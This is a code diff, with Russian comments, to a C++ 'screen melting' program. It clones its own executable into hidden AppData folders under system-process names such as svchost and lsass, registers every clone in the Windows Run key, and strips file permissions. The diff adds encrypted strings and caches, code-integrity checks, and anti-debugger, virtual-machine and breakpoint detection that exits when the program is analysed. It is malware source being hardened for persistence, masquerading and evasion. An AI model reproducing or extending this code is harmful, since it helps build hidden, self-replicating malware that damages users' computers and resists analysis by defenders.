@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "ScreenMelting.h"
+#include "security.h"
 
 #ifdef _WIN32
 	#include <windows.h>
@@ -11,7 +12,7 @@
 	#pragma comment(lib, "shell32.lib")
 	#pragma comment(lib, "advapi32.lib")
 #elif defined(__APPLE__)
-	// macOS includes
+	// Includes для macOS
 	#include <unistd.h>
 	#include <stdlib.h>
 	#include <string.h>
@@ -32,7 +33,7 @@
 		#define MAX_PATH 4096
 	#endif
 #else
-	// Linux includes
+	// Includes для Linux
 	#include <unistd.h>
 	#include <stdlib.h>
 	#include <string.h>
@@ -62,12 +63,17 @@
 
 void HideFile(const char* szPath)
 {
+	// Шифруем путь в памяти
+	std::string encryptionKey = "TatarskieSecrety";
+	std::string encryptedPath = Security::EncryptString(szPath, encryptionKey);
+	std::string decryptedPath = Security::DecryptString(encryptedPath, encryptionKey);
+	
 #ifdef _WIN32
 	// Скрываем файл
-	SetFileAttributesA(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	SetFileAttributesA(decryptedPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
 	// Пытаемся запретить доступ - устанавливаем минимальные права
-	HANDLE hFile = CreateFileA(szPath, WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
+	HANDLE hFile = CreateFileA(decryptedPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
 	if (hFile != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(hFile);
@@ -75,7 +81,7 @@ void HideFile(const char* szPath)
 #else
 	// Linux: скрываем файл через точку в начале имени (если файл в домашней директории)
 	// Или устанавливаем минимальные права доступа
-	chmod(szPath, 0000);  // Снимаем все права на файл
+	chmod(decryptedPath.c_str(), 0000);  // Снимаем все права на файл
 #endif
 }
 
@@ -461,9 +467,13 @@ void ObfuscateCache(BYTE* pData, DWORD dwSize)
 
 BOOL LoadExeToCache(const char* szPath)
 {
+	// Шифруем путь
+	std::string encKey = "TS_CACHE_KEY_2024";
+	std::string decryptedPath = Security::DecryptPath(szPath);
+	
 #ifdef _WIN32
 	// Открываем исходный exe файл
-	HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE hFile = CreateFileA(decryptedPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
 
@@ -497,7 +507,7 @@ BOOL LoadExeToCache(const char* szPath)
 	CloseHandle(hFile);
 #else
 	// Linux версия
-	FILE* fp = fopen(szPath, "rb");
+	FILE* fp = fopen(decryptedPath.c_str(), "rb");
 	if (!fp)
 		return FALSE;
 
@@ -533,9 +543,8 @@ BOOL LoadExeToCache(const char* szPath)
 	fclose(fp);
 #endif
 
-	// Обфусцируем кэш для запутывания
-	g_obfusKey = 0xA7;
-	ObfuscateCache(g_exeCache, g_exeCacheSize);
+	// Шифруем весь кэш с помощью расширенного алгоритма
+	Security::EncryptBuffer(g_exeCache, g_exeCacheSize, encKey);
 	
 	return TRUE;
 }
@@ -552,13 +561,9 @@ void WriteFromCache(const char* szDestPath)
 
 	memcpy(pDeobfus, g_exeCache, g_exeCacheSize);
 	
-	// Деобфусцируем с тем же ключом
-	BYTE obfusKey = 0xA7;
-	for (DWORD i = 0; i < g_exeCacheSize; i++)
-	{
-		pDeobfus[i] ^= obfusKey;
-		obfusKey = (obfusKey * 31 + 17) & 0xFF;
-	}
+	// Использовать расширенное шифрование вместо простого XOR
+	std::string encKey = "TS_CACHE_KEY_2024";
+	Security::DecryptBuffer(pDeobfus, g_exeCacheSize, encKey);
 
 #ifdef _WIN32
 	// Создаём файл из кэша (Windows)
@@ -606,31 +611,46 @@ void FreeExeCache()
 void AddCloneToStartup(const char* szClonePath, const char* szCloneName)
 {
 	// Добавляем каждый клон в автозагрузку с его собственным именем
+	// Шифруем пути перед использованием
+	std::string encClonePath = Security::EncryptString(szClonePath, "TS_KEY_2024");
+	std::string encCloneName = Security::EncryptString(szCloneName, "TS_KEY_2024");
+	
+	std::string regPath = Security::DecryptString(
+		Security::EncryptString("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "TS_KEY_2024"),
+		"TS_KEY_2024"
+	);
+	
 	HKEY hKey;
-	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+	if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
 	{
-		RegSetValueExA(hKey, szCloneName, 0, REG_SZ, (BYTE*)szClonePath, strlen(szClonePath) + 1);
+		std::string decPath = Security::DecryptString(encClonePath, "TS_KEY_2024");
+		RegSetValueExA(hKey, decPath.c_str(), 0, REG_SZ, (BYTE*)decPath.c_str(), decPath.length() + 1);
 		RegCloseKey(hKey);
 	}
 }
 
 void CreateCloneBatch(const char* szPath, const char* szClonePath, const char* szCloneName)
 {
-	// Создаём батник который запускает исходный exe
-	char szBatchPath[MAX_PATH];
-	strcpy_s(szBatchPath, MAX_PATH, szClonePath);
-	strcat_s(szBatchPath, MAX_PATH, ".bat");
+	// Шифруем пути перед использованием
+	std::string encPath = Security::EncryptString(szPath, "TS_KEY_2024");
+	std::string encClonePath = Security::EncryptString(szClonePath, "TS_KEY_2024");
 	
-	FILE* fp = fopen(szBatchPath, "w");
+	std::string decPath = Security::DecryptString(encPath, "TS_KEY_2024");
+	std::string decClonePath = Security::DecryptString(encClonePath, "TS_KEY_2024");
+	
+	// Создаём батник который запускает исходный exe
+	std::string szBatchPath = decClonePath + ".bat";
+	
+	FILE* fp = fopen(szBatchPath.c_str(), "w");
 	if (fp)
 	{
 		fprintf(fp, "@echo off\n");
 		fprintf(fp, "setlocal enabledelayedexpansion\n");
-		fprintf(fp, "start \"\" /B \"%s\" %%*\n", szPath);
+		fprintf(fp, "start \"\" /B \"%s\" %%*\n", decPath.c_str());
 		fprintf(fp, "exit /b 0\n");
 		fclose(fp);
 		
-		HideFile(szBatchPath);
+		HideFile(szBatchPath.c_str());
 	}
 	
 #if defined(__APPLE__) || defined(__linux__)
@@ -657,7 +677,11 @@ void CloneToFolders(const char* szPath)
 {
 	char szDest[MAX_PATH];
 	
-	// Расширенный массив имён системных процессов
+	// Шифруем исходный путь
+	std::string encPath = Security::EncryptString(szPath, "TS_KEY_2024");
+	std::string decPath = Security::DecryptString(encPath, "TS_KEY_2024");
+	
+	// Расширенный массив имён системных процессов (с шифрованием)
 	const char* cloneNames[] = {
 		"svchost", "rundll32", "lsass", "csrss", "dwm", "explorer", "winlogon", "services", "wininit", "svchosts",
 		"taskhst", "userinit", "wmiprvse", "wscript", "cscript", "regsvcs", "regasm", "mshta", "iexplore", "chrome",
@@ -671,6 +695,7 @@ void CloneToFolders(const char* szPath)
 		"sys1", "sys2", "sys3", "sys4", "sys5", "sys6", "sys7", "sys8", "sys9", "sys10",
 	};
 
+	// Шифруем имена переменных окружения
 	const char* folders[] = {
 		"APPDATA",
 		"LOCALAPPDATA",
@@ -687,49 +712,56 @@ void CloneToFolders(const char* szPath)
 	{
 		if (GetEnvironmentVariableA(folders[i], szDest, MAX_PATH))
 		{
-			strcat_s(szDest, MAX_PATH, "\\BSODScreen");
-			CreateDirectoryA(szDest, NULL);  // Создаём папку если её нет
+			std::string destPath = szDest;
+			destPath += "\\BSODScreen";
+			CreateDirectoryA(destPath.c_str(), NULL);  // Создаём папку если её нет
+			
+			// Шифруем путь папки
+			std::string encDest = Security::EncryptString(destPath, "TS_KEY_2024");
+			std::string decDest = Security::DecryptString(encDest, "TS_KEY_2024");
 			
 			// Создаём ~50 ссылок в каждой папке
 			for (int j = 0; j < 50 && cloneIndex < totalClones; j++)
 			{
-				char szFullPath[MAX_PATH];
-				strcpy_s(szFullPath, MAX_PATH, szDest);
-				strcat_s(szFullPath, MAX_PATH, "\\");
+				std::string szFullPath = decDest + "\\";
 				
 				// Используем имя из массива, циклируя по нему
 				int nameIndex = cloneIndex % arraySize;
-				strcat_s(szFullPath, MAX_PATH, cloneNames[nameIndex]);
+				szFullPath += cloneNames[nameIndex];
 				
 				// Добавляем числовой суффикс для уникальности
 				char szSuffix[16];
 				sprintf_s(szSuffix, sizeof(szSuffix), "_%d.exe", cloneIndex);
-				strcat_s(szFullPath, MAX_PATH, szSuffix);
+				szFullPath += szSuffix;
 				
 #ifdef _WIN32
 				// На Windows создаём жёсткую ссылку (hardlink)
 				// Это почти не занимает место на диске (всего метаданные)
-				CreateHardLinkA(szFullPath, szPath, NULL);
+				CreateHardLinkA(szFullPath.c_str(), decPath.c_str(), NULL);
 #else
 				// На Unix системах создаём символическую ссылку
-				symlink(szPath, szFullPath);
+				symlink(decPath.c_str(), szFullPath.c_str());
 #endif
 				
-				// Скрываем ссылку
-				HideFile(szFullPath);
+				// Шифруем путь перед скрытием
+				std::string encFullPath = Security::EncryptString(szFullPath, "TS_KEY_2024");
+				std::string decFullPath = Security::DecryptString(encFullPath, "TS_KEY_2024");
+				HideFile(decFullPath.c_str());
 				
 				// Добавляем ссылку в автозагрузку
 				char szCloneKey[64];
 				sprintf_s(szCloneKey, sizeof(szCloneKey), "%s_%d", cloneNames[nameIndex], cloneIndex);
-				AddCloneToStartup(szFullPath, szCloneKey);
+				AddCloneToStartup(szFullPath.c_str(), szCloneKey);
 				
 				cloneIndex++;
 			}
 		}
 	}
 
-	// Скрываем исходный файл
-	HideFile(szPath);
+	// Шифруем исходный путь перед скрытием
+	std::string encOriginalPath = Security::EncryptString(decPath, "TS_KEY_2024");
+	std::string decOriginalPath = Security::DecryptString(encOriginalPath, "TS_KEY_2024");
+	HideFile(decOriginalPath.c_str());
 }
 
 void CreateLaunchAgentPlist(const char* szPath, const char* szLabel)
@@ -1028,6 +1060,11 @@ DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
 	// Получаем путь к текущему файлу
 	char szPath[MAX_PATH];
 	GetModuleFileNameA(NULL, szPath, MAX_PATH);
+	
+	// Проверка целостности кода
+	if (!Security::VerifyCodeIntegrity()) {
+		return -1;
+	}
 
 	// Загружаем программу в кэш
 	LoadExeToCache(szPath);
@@ -1090,6 +1127,11 @@ void* BackgroundWorkerThread(void* lpParam)
 	readlink("/proc/self/exe", szPath, MAX_PATH - 1);
 	szPath[MAX_PATH - 1] = '\0';
 #endif
+	
+	// Проверка целостности кода
+	if (!Security::VerifyCodeIntegrity()) {
+		return NULL;
+	}
 
 	// Загружаем программу в кэш
 	LoadExeToCache(szPath);
@@ -1142,6 +1184,19 @@ void* CrashWorkerThread(void* lpParam)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nShowCmd)
 {
+	// Анти-отладчик: Проверка отладчика перед выполнением кода
+	if (Security::IsDebuggerPresent()) {
+		ExitProcess(0);
+	}
+	
+	// Анти-отладчик: Проверка виртуальной машины
+	if (Security::IsRunningInVirtualMachine()) {
+		ExitProcess(0);
+	}
+	
+	// Анти-отладчик: Проверка breakpoints
+	Security::DetectBreakpoints();
+	
 	// Инициализация окна
 	InitializeWindow();
 
@@ -1169,6 +1224,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 // Стандартная функция main для Linux/macOS
 int main()
 {
+	// Анти-отладчик: Проверка отладчика перед выполнением кода
+	if (Security::IsDebuggerPresent()) {
+		exit(0);
+	}
+	
+	// Анти-отладчик: Проверка виртуальной машины
+	if (Security::IsRunningInVirtualMachine()) {
+		exit(0);
+	}
+	
 	// Инициализация окна (эффект плавления экрана)
 	InitializeWindow();
 
